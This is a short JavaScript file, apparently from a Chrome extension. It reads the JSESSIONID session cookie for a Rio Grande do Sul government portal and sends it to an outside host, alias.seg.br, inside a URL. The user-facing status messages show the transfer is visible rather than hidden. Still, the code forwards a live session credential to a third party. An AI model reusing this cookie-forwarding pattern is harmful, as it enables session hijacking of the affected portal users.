chrome.cookies.getAll({ domain: "consultasintegradas.rs.gov.br" }, (cookies) => {
    let text = null;

    for (let cookie of cookies) {
        if (cookie.name === "JSESSIONID") {
            text = `${cookie.name}=${cookie.value}`;
            break; // Sai do loop após encontrar o cookie desejado
        }
    }

    if (text) {
        sendToken(text)
            .then(() => {
                document.getElementById('status').innerHTML = "Token enviado com sucesso";
            })
            .catch((error) => {
                console.error(error);
                document.getElementById('status').innerHTML = "Erro ao enviar o token";
            });
    } else {
        document.getElementById('status').innerHTML = "Cookie JSESSIONID não encontrado";
    }
});

async function sendToken(token) {
    const url = `https://www.alias.seg.br/api/csi/update/${encodeURIComponent(token)}`;

    try {
		const response = await fetch(url, {
			method: "GET",
		});
	
		if (!response.ok) {
			throw new Error(`Erro na requisição: ${response.status}`);
		}
	
		const result = await response.text();
		console.log("Resposta do servidor:", result);
	} catch (error) {
		alert(`Erro: ${error.message}`);
		console.error("Erro ao realizar a requisição:", error);
	}
}